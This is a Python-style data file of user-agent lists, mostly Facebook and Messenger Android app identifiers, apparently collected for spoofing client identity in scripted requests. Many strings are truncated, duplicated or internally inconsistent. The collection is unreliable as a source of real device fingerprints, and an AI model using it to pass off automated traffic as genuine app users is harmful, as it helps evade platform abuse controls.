    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; LM-Q610.FG Build\\/011019) [FBAN\\/FB4A;FBAV\\/225.0.0.47.118;FBPN\\/com.facebook.katana;FBLC\\/pl_PL;FBBV\\/158425924;FBCR\\/PLAY;FBMF\\/LGE;FBBD\\/lge;FBDV\\/LM-Q610.FG;FBSV\\/8.1.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.625,width=1080,height=2034};FB_FW\\/1;FBRV\\/159951317;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; RMX3151 Build\\/RP1A.200720.011) [FBAN\\/Orca-Android;FBAV\\/391.2.0.20.404;FBPN\\/com.facebook.orca;FBLC\\/cs_CZ;FBBV\\/437533953;FBCR\\/Vodafone',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.1.1; SM-J250F Build\\/NMF26X) [FBAN\\/Orca-Android;FBAV\\/66.0.3774.127;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/854283466;FBCR\\/XL Axiata;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-J250F;FBSV\\/7.1.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.25,height=1024,width=2048};]',
    'Dalvik\\/2.1.0 (Linux; U; Android 5; Moto Build\\/QP1A.244982.977) [FBAN\\/Orca-Android;FBAV\\/288.0.0.15.118;FBPN\\/com.facebook.orca;FBLC\\/pl_PL;FBBV\\/253310653;FBCR\\/PLAY (T-Mobile);FBMF\\/Xiaomi;FBBD\\/xiaomi;FBDV\\/Redmi Note 8T;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.75,width=1080,height=2130};FB_FW\\/1;FBBK\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; M2006C3MNG MIUI\\/V12.0.14.0.QCSEUXM) [FBAN\\/Orca-Android;FBAV\\/396.0.0.14.82;FBPN\\/com.facebook.orca;FBLC\\/cs_CZ;FBBV\\/446475560;FBCR\\/O2.CZ;FBMF\\/Xiaomi;FBBD\\/Redmi;FBDV\\/M2006C3MNG;FBSV\\/10;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1449};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; 2201117SY Build\\/RP1A.200720.011) [FBAN\\/Orca-Android;FBAV\\/393.0.0.18.92;FBPN\\/com.facebook.orca;FBLC\\/es_ES;FBBV\\/440593596;FBCR\\/Digi.Mobil;FBMF\\/Xiaomi;FBBD\\/Redmi;FBDV\\/2201117SY;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.75,width=1080,height=2177};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; moto e(7i) power Build\\/QOJS30.506-7-18) [FBAN\\/FB4A;FBAV\\/407.0.0.30.97;FBPN\\/com.facebook.katana;FBLC\\/es_US;FBBV\\/458543253;FBCR\\/UNEFON 4G;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto e(7i) power;FBSV\\/10;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.75,width=720,height=1472};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; Redmi Note 7 MIUI\\/V10.3.6.0.PFGEUXM) [FBAN\\/Orca-Android;FBAV\\/241.0.0.17.116;FBPN\\/com.facebook.orca;FBLC\\/es_ES;FBBV\\/182747450;FBCR\\/MASMOVIL;FBMF\\/Xiaomi;FBBD\\/xiaomi;FBDV\\/Redmi Note 7;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.75,width=1080,height=2130};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 6.0.1; D6503 Build\\/23.5.A.1.291) [FBAN\\/Orca-Android;FBAV\\/139.0.0.17.85;FBPN\\/com.facebook.orca;FBLC\\/in_ID;FBBV\\/74871072;FBCR\\/Far EasTone;FBMF\\/Sony;FBBD\\/Sony;FBDV\\/D6503;FBSV\\/6.0.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1776};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; moto g go Build\\/RRHG31.Q3-37-43-43-5-4) [FBAN\\/FB4A;FBAV\\/386.0.0.35.108;FBPN\\/com.facebook.katana;FBLC\\/en_US;FBBV\\/402949595;FBCR\\/AT&amp;amp-T;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto g go;FBSV\\/11;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.75,width=720,height=1504};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; SM-G930F Build\\/R16NW) [FBAN\\/FB4A;FBAV\\/187.0.0.43.81;FBPN\\/com.facebook.katana;FBLC\\/fr_FR;FBBV\\/122388438;FBCR\\/Bouygues Telecom;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G930F;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,h',
    'Dalvik\\/2.1.0 (Linux; U; Android 9.0; SM-A40s&#039;20&#039; Build\\/LMY47I) [FBAN\\/AudienceNetworkForAndroid;FBSN\\/Android;FBSV\\/9.0;FBAB\\/com.playit.videoplayer;FBAV\\/2.4.9.22; FBBV\\/20409022;FBVS\\/5.9.0;FBLC\\/in_ID]',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; moto e(7) plus Build\\/QPZS30.30-Q3-38-69-12) [FBAN\\/FB4A;FBAV\\/407.0.0.30.97;FBPN\\/com.facebook.katana;FBLC\\/es_US;FBBV\\/458543257;FBCR\\/AT&amp;amp-T;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto e(7) plus;FBSV\\/10;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.75,width=720,height=1515};FB_FW\\/1;FBRV\\/460183955;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 13; Pixel 6a Build\\/TQ2A.230505.002) [FBAN\\/Orca-Android;FBAV\\/406.0.0.13.115;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/470794982;FBCR\\/Google Fi;FBMF\\/Google;FBBD\\/google;FBDV\\/Pixel',
    'Dalvik\\/2.1.0 (Linux; Android 10; POCOPHONE F1) [FBAN\\/MobileAdsManagerAndroid;FBAV\\/324.0.0.28.115;FBBV\\/464692125;FBRV\\/0;FBPN\\/com.facebook.adsmanager;FBLC\\/en_US;FBMF\\/POCOPHONE;FBBF\\/Poco;FBDV\\/Poco F1;FBSV\\/10;FBCA\\/arm64-v8a:armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1424};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.1.2; ASUS_Z01QD Build\\/N2G48H) [FBAN\\/FB4A;FBAV\\/382.0.0.33.111;FBPN\\/com.facebook.katana;FBLC\\/zh_CN;FBBV\\/394408512;FBCR\\/EE;FBMF\\/Asus;FBBD\\/Asus;FBDV\\/ASUS_Z01QD;FBSV\\/7.1.2;FBCA\\/x86:armeabi-v7a;FBDM\\/{density=1.5,width=800,height=1280};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1.0; CPH1909 Build\\/O11019) [FBAN\\/FB4A;FBAV\\/382.0.0.33.111;FBPN\\/com.facebook.katana;FBLC\\/km_KH;FBBV\\/394408901;FBCR\\/Metfone;FBMF\\/OPPO;FBBD\\/OPPO;FBDV\\/CPH1909;FBSV\\/8.1.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1424};FB_FW\\/1;FBRV\\/396611140;]',
    'dalvik\\/ 2.1.0 (linux; u, Android 13 SM-A326B build\\/ TP1A.220624.014) [FBAN\\/Orca-_FBAN\\/FB4A;FBAV\\/420.0.0.32.61;FBBV\\/486988352;FBDM42-29',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0.0; MMB29K Build\\/GT-I5508) [FBAN\\/FB4A;FBAV\\/409.0.0.13.251;FBBV\\/349036431;FBDM\\/{density=2.0,width=720,height=1280};FBLC\\/en_US;FBRV\\/349036431;FBCR\\/Movistar;FBMF\\/samsung;FBBD\\/samsung;FBPN\\/com.facebook.orca;FBDV\\/MMB29K;FBSV\\/7.0.0;FBOP\\/1;FBCA\\/armeabi-v7a:armeabi;FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0.0; GT-N7105 Build\\/GT-7320) [FBAN\\/FB4A;FBAV\\/133.0.0.48.536;FBBV\\/137289708;FBDM\\/{density=2.0,width=720,height=1280};FBLC\\/en_US;FBRV\\/137289708;FBCR\\/Movistar;FBMF\\/samsung;FBBD\\/samsung;FBPN\\/com.facebook.orca;FBDV\\/GT-N7105;FBSV\\/7.0.0;FBOP\\/1;FBCA\\/armeabi-v7a:armeabi;FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux\\; U\\; Android 11\\; SM-N975F Build\\/RP1A.200720.012) [FBAN\\/AudienceNetworkForAndroid\\;FBSN\\/Android\\;FBSV\\/11\\;FBAB\\/com.antutu.ABenchMark\\;FBAV\\/8.2.4\\;FBBV\\/8020400\\;FBVS\\/5.6.0\\;FBLC\\/ru_RU]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; VIA P3Dalvik\\/2.1.0 (Linux; U; Android 9; VIA_P3 Build\\/PPR1.180610.011) [FBAN\\/FB4A;FBAV\\/417.0.0.33.65;FBPN\\/com.facebook.katana;FBLC\\/tr_TR;FBBV\\/480085463;FBCR\\/Turk Telekom;FBMF\\/Casper;FBBD\\/Casper;FBDV\\/VIA_P3;FBSV\\/9;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1360};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 13; SM-S901U Build\\/TP1A.220624.014) [FBAN\\/Orca-Android;FBAV\\/421.0.0.12.61;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/502432091;FBCR\\/T-Mobile;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-S901U;FBSV\\/13;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2115};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1.1; F1w Build\\/LMY47V) [FBAN\\/FB4A;FBAV\\/94.0.0.17.68;FBPN\\/com.facebook.katana;FBLC\\/vi_VN;FBBV\\/38831839;FBCR\\/VINAPHONE;FBMF\\/OPPO;FBBD\\/OPPO;FBDV\\/F1w;FBSV\\/5.1.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1280};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; TECNO KI5k Build\\/SP1A.210812.016) [FBAN\\/Orca-Android;FBAV\\/377.0.0.13.101;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/396116327;FBCR\\/LoneStar;FBMF\\/TECNO;FBBD\\/TECNO;FBDV\\/TECNO KI5k;FBSV\\/12;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1444};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; SM-A217F Build\\/SP1A.210812.016) [FBAN\\/Orca-Android;FBAV\\/422.0.0.18.107;FBPN\\/com.facebook.orca;FBLC\\/pt_PT;FBBV\\/505323569;FBCR\\/Unitel STP;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A217F;FBSV\\/12;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.0,width=720,height=1532};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 7.0; M5 Note Build\\/NRD90M) [FBAN\\/FB4A;FBAV\\/292.0.0.61.123;FBPN\\/com.facebook.katana;FBLC\\/ru_RU;FBBV\\/251145728;FBCR\\/MegaFon;FBMF\\/Meizu;FBBD\\/Meizu;FBDV\\/M5 Note;FBSV\\/7.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=3.0,width=1080,height=1920};FB_FW\\/1;FBRV\\/0;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; TECNO KI5k Build\\/SP1A.210812.016) [FBAN\\/Orca-Android;FBAV\\/377.0.0.13.101;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/396116327;FBCR\\/MTN;FBMF\\/TECNO;FBBD\\/TECNO;FBDV\\/TECNO KI5k;FBSV\\/12;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1444};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 13; SM-S134DL Build\\/TP1A.220624.014) [FBAN\\/Orca-Android;FBAV\\/405.0.0.16.112;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/466674869;FBCR\\/&amp;#160-;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-S134DL;FBSV\\/13;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.875,width=720,height=1465};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.1; Dragon Face Build\\/NHG47L) [FBAN\\/FB4A;FBAV\\/343.0.0.37.117;FBPN\\/com.facebook.katana;FBLC\\/ar_EG;FBBV\\/329937443;FBCR\\/null;FBMF\\/Amlogic;FBBD\\/Amlogic;FBDV\\/Dragon Face;FBSV\\/8.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.0,width=1280,height=720};FB_FW\\/1;FBRV\\/332189930;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 5.1; Vowney Build\\/LMY47I) [FBAN\\/Orca-Android;FBAV\\/271.0.0.11.120;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/227270172;FBCR\\/null;FBMF\\/elephone;FBBD\\/elephone;FBDV\\/Vowney;FBSV\\/5.1;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=4.0,width=1440,height=2368};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 9; JKM-LX1 Build\\/HUAWEIJKM-LX1) [FBAN\\/MessengerLite;FBAV\\/273.0.0.16.48;FBPN\\/com.facebook.mlite;FBLC\\/en_US;FBBV\\/325178905;FBCR\\/null;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/JKM-LX1;FBSV\\/9;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2137};]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; CPH2385 Build\\/SP1A.210812.016) [FBAN\\/AudienceNetworkForAndroid;FBSN\\/Android;FBSV\\/12;FBAB\\/com.miniclip.realsniper;FBAV\\/500202;FBBV\\/500202;FBVS\\/6.12.0;FBLC\\/en_NZ]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; SM-A125F Build\\/SP1A.210812.016) [FBAN\\/Orca-Android;FBAV\\/384.0.0.18.104;FBPN\\/com.facebook.orca;FBLC\\/lt_LT;FBBV\\/412138691;FBCR\\/Tele2 LT;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A125F;FBSV\\/12;FBCA\\/arm64-v8a:null;FBDM\\/{density=1.875,width=720,height=1465};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux\\; U\\; Android 13\\; M2101K7BNY Build\\/TP1A.220624.014) [FBAN\\/AudienceNetworkForAndroid\\;FBSN\\/Android\\;FBSV\\/13\\;FBAB\\/cat.mansion.merge.games\\;FBAV\\/1.06\\;FBBV\\/106\\;FBVS\\/6.14.0\\;FBLC\\/ru_RU]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; moto g play - 2023 Build\\/S3SGS32.39-181-5) [FBAN\\/Orca-Android;FBAV\\/424.0.0.25.113;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/510343531;FBCR\\/Verizon ;FBMF\\/motorola;FBBD\\/motorola;FBDV\\/moto g play - 2023;FBSV\\/12;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=1.75,width=720,height=1439};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 13; M2103K19G Build\\/TP1A.220624.014) [FBAN\\/Orca-Android;FBAV\\/416.0.0.9.76;FBPN\\/com.facebook.orca;FBLC\\/es_ES;FBBV\\/491071575;FBCR\\/JAZZTEL;FBMF\\/Xiaomi;FBBD\\/Redmi;FBDV\\/M2103K19G;FBSV\\/13;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.375,width=1080,height=2138};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 10; SM-T835 Build\\/QP1A.190711.020) [FBAN\\/Orca-Android;FBAV\\/342.1.0.14.119;FBPN\\/com.facebook.orca;FBLC\\/en_AU;FBBV\\/339015011;FBCR\\/YES OPTUS;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-T835;FBSV\\/10;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.25,width=1600,height=2452};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 13; Leelbox Build\\/PPR1.281373.396) [FBAN\\/FB4A;FBAV\\/271.0.0.55.109;FBBV\\/215365690;FBDM\\/{density=3.0,width=1080,height=2208};FBLC\\/en_GB;FBRV\\/216077496;FBCR\\/inwi;FBMF\\/OPPO;FBBD\\/OPPO;FBPN\\/com.facebook.katana;FBDV\\/CPH1989;FBSV\\/9;FBOP\\/1;FBCA\\/arm64-v8a:;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; Z6356T Build\\/RP1A.201005.001) [FBAN\\/Orca-Android;FBAV\\/428.0.0.35.115;FBPN\\/com.facebook.orca;FBLC\\/en_AU;FBBV\\/520514255;FBCR\\/Telstra;FBMF\\/ZTE;FBBD\\/ZTE;FBDV\\/Z6356T;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.25,width=720,height=1466};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; Z6356T Build\\/RP1A.201005.001) [FBAN\\/Orca-Android;FBAV\\/428.0.0.35.115;FBPN\\/com.facebook.orca;FBLC\\/en_AU;FBBV\\/520514424;FBCR\\/Telstra;FBMF\\/ZTE;FBBD\\/ZTE;FBDV\\/Z6356T;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.0,width=720,height=1476};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 8.0.0; RNE-L22 Build\\/HUAWEIRNE-L22) [FBAN\\/Orca-Android;FBAV\\/426.0.0.27.102;FBPN\\/com.facebook.orca;FBLC\\/in_ID;FBBV\\/515381945;FBCR\\/Telkomsel;FBMF\\/HUAWEI;FBBD\\/HUAWEI;FBDV\\/RNE-L22;FBSV\\/8.0.0;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.75,width=1080,height=2050};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; SM-A217F Build\\/SP1A.210812.016) [FBAN\\/AudienceNetworkForAndroid;FBSN\\/Android;FBSV\\/12;FBAB\\/com.miniclip.carrom;FBAV\\/15.2.0;FBBV\\/931;FBVS\\/6.16.0;FBLC\\/en_GB]',
    'Dalvik\\/2.1.0 (Linux; U; Android 13.0; Samsung Galaxy S21 Build\\/OPR1.8610) [FBAN\\/EMA;FBBV\\/470353487;FBAV\\/353.0.0.5.112;FBDV\\/Samsung Galaxy S21;FBLC\\/id_ID;FBNG\\/WIFI;FBMNT\\/METERED;FBDM\\/{density=3.0}]',
    'Dalvik\\/2.1.0 (Linux; U; Android 11; Redmi Note 8T Build\\/RKQ1.201004.002) [FBAN\\/Orca-Android;FBAV\\/433.0.0.32.117;FBPN\\/com.facebook.orca;FBLC\\/cs_CZ;FBBV\\/532438891;FBCR\\/O2.CZ;FBMF\\/Xiaomi;FBBD\\/xiaomi;FBDV\\/Redmi Note 8T;FBSV\\/11;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.75,width=1080,height=2130};FB_FW\\/1;] FBBK\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 13; SM-G780G Build\\/TP1A.220624.014) [FBAN\\/Orca-Android;FBAV\\/435.0.0.32.108;FBPN\\/com.facebook.orca;FBLC\\/pt_BR;FBBV\\/537314828;FBCR\\/VIVO;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G780G;FBSV\\/13;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2168};FB_FW\\/1',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; SM-A032F Build\\/SP1A.210812.016) [FBAN\\/Orca-Android;FBAV\\/439.0.0.29.119;FBPN\\/com.facebook.orca;FBLC\\/pt_PT;FBBV\\/548243055;FBCR\\/Unitel STP;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A032F;FBSV\\/12;FBCA\\/armeabi-v7a:armeabi;FBDM\\/{density=2.0,width=720,height=1459};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 13; SM-G770F Build\\/TP1A.220624.014) [FBAN\\/Orca-Android;FBAV\\/439.0.0.29.119;FBPN\\/com.facebook.orca;FBLC\\/bg_BG;FBBV\\/548243065;FBCR\\/null;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-G770F;FBSV\\/13;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2163};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; vivo 1920 Build\\/SP1A.210812.003) [FBAN\\/Orca-Android;FBAV\\/439.0.0.29.119;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/548243065;FBCR\\/No service;FBMF\\/vivo;FBBD\\/vivo;FBDV\\/vivo 1920;FBSV\\/12;FBCA\\/arm64-v8a:null;FBDM\\/{density=3.0,width=1080,height=2141};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 13; 2209116AG Build\\/TKQ1.221114.001) [FBAN\\/Orca-Android;FBAV\\/440.0.0.30.352;FBPN\\/com.facebook.orca;FBLC\\/es_ES;FBBV\\/554361140;FBCR\\/Digi.Mobil;FBMF\\/Xiaomi;FBBD\\/Redmi;FBDV\\/2209116AG;FBSV\\/13;FBC',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; SM-A235F Build\\/SP1A.210812.016) [FBAN\\/Orca-Android;FBAV\\/440.0.0.30.352;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/554361140;FBCR\\/null;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A235F;FBSV\\/12;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.8125,width=1080,height=2199};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 13; SM-F936B Build\\/TP1A.220624.014) [FBAN\\/Orca-Android;FBAV\\/440.0.0.30.352;FBPN\\/com.facebook.orca;FBLC\\/en_AU;FBBV\\/554361140;FBCR\\/null;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-F936B;FBSV\\/13;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=904,height=2103};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; vivo 1920 Build\\/SP1A.210812.003) [FBAN\\/Orca-Android;FBAV\\/439.0.0.29.119;FBPN\\/com.facebook.orca;FBLC\\/en_US;FBBV\\/548243065;FBCR\\/No service;FBMF\\/vivo;FBBD\\/vivo;FBDV\\/vivo',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; SM-A525F Build\\/SP1A.210812.016) [FBAN\\/Orca-Android;FBAV\\/439.0.0.29.119;FBPN\\/com.facebook.orca;FBLC\\/en_GB;FBBV\\/548243065;FBCR\\/null;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A525F;FBSV\\/12;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.625,width=1080,height=2186};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; SM-A235F Build\\/SP1A.210812.016) [FBAN\\/Orca-Android;FBAV\\/436.0.0.45.111;FBPN\\/com.facebook.orca;FBLC\\/fr_GN;FBBV\\/541554436;FBCR\\/Orange GN;FBMF\\/samsung;FBBD\\/samsung;FBDV\\/SM-A235F;FBSV\\/12;FBCA\\/arm64-v8a:null;FBDM\\/{density=2.8125,width=1080,height=2207};FB_FW\\/1;]',
    'Dalvik\\/2.1.0 (Linux; U; Android 12; SM-A235F Build\\/SP1A.210812.016) [FBAN\\/Orca-Android;FBAV\\/436.0.0.45.111;FBPN\\/com.facebook.orca;FBLC\\/fr_GN;FBBV\\/541554436;FBCR\\/Orange',
    'Dalvik\\/1.6.0 (Linux; U; Android 5; SM-G3518 Build\\/JLS36C) [FBAN\\/Orca-Android;FBAV\\/299.0.0.12.112;FBPN\\/com.facebook.orca;FBLC\\/es_MX;FBBV\\/199281912;FBCR\\/Maxcom;FBMF\\/samsung;FBBD\\/samsung;;FBDV\\/SM-G3518;FBDM\\/{density=1.0,width=720,=height=1200};FBSV\\/13.0.1;FBCA\\/armeabi-v7a:armeabi;]',
    'Dalvik\\/1.6.0 (Linux; U; Android 13; SM-G3518 Build\\/JLS36C) [FBAN\\/Orca-Android;FBAV\\/299.0.0.12.112;FBPN\\/com.facebook.orca;FBLC\\/es_MX;FBBV\\/199281912;FBCR\\/Maxcom;FBMF\\/samsung;FBBD\\/samsung;;FBDV\\/SM-G3518;FBDM\\/{density=1.0,width=720,=height=1200};FBSV\\/13.0.1;FBCA\\/armeabi-v7a:armeabi;]']
ua = [
    'WirtschaftsWoche-iOS-1.1.14-20200824.1315']
ua = [
    'FBAN/FB4A;FBAV/222.0.0.48.113;FBBV/155323366;FBDM/{density=2.0,width=720,height=1360};FBLC/sr_RS;FBRV/156625696;FBCR/mt:s;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi']
ua = [
    'Wget/1.17.1 (linux-gnu']
ua = [
    'DoCoMo/2.0 P903i']
ua = [
    'WirtschaftsWoche-iOS-1.1.14-20200824.1315']
ua = [
    'DoCoMo/2.0 P903i(c100;TB;W24H12']
ua = [
    'DoCoMo/2.0 SH10C(c500;TB;W16H12']
ua = [
    'nokia-7.1-safari']
ua = [
    'NOKIA6120cUCBrowser/8.7.1.234/28/444/UCWEB']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 6.0.1; Nexus Player Build/MMB29T']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTMM Build/NS6264) CTV']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 9; SM-N950U Build/PPR1.180610.011']
ua = [
    'Dalvik/1.6.0 (Linux; U; Android 4.4.4; WT19M-FI Build/KTU84Q']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 9; SM-N960U Build/PPR1.180610.011']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 9; SM-G955U Build/PPR1.180610.011']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 10; SM-G965U Build/QP1A.190711.020']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 10; SM-N960U Build/QP1A.190711.020']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 10; SM-G975U Build/QP1A.190711.020']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 7.1.2; AFTBAMR311 Build/NS6264) CTV']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 9; SM-A102U Build/PPR1.180610.011']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 8.0.0; SM-G935V Build/R16NW']
ua = [
    'Dalvik/1.6.0 (Linux; U; Android 4.0.4; GT-P7510 Build/IMM76D']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 5.1; AFTM Build/LMY47O']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=720,height=1440']
ua = [
    'Dalvik/1.6.0 (Linux; U; Android 4.4.2; ASUS_T00Q Build/KVT49L)UNTRUSTED/1.0C-1.1; Opera Mini/att/4.2']
ua = [
    'Dalvik/1.4.0 (Linux; U; Android 2.3.6; HUAWEI Y210-0100 Build/HuaweiY210-0100']
ua = [
    'Dalvik/1.4.0 (Linux; U; Android 2.3.6; GT-S5570 Build/GINGERBREAD']
ua = [
    'Dalvik/1.6.0 (Linux; U; Android 4.2.2; Galaxy Nexus Build/JDQ39']
ua = [
    'Dalvik/2.1.0 (Linux; U; Android 5.1; PRO 5 Build/LMY47D']
ua = [
    'Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z007;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a']
ua = [
    'WeRead/3.5.0 WRBrand/HUAWEI Dalvik/2.1.0 (Linux; U; Android 6.0; DIG-AL00 Build/HUAWEIDIG-AL00']
ua = [
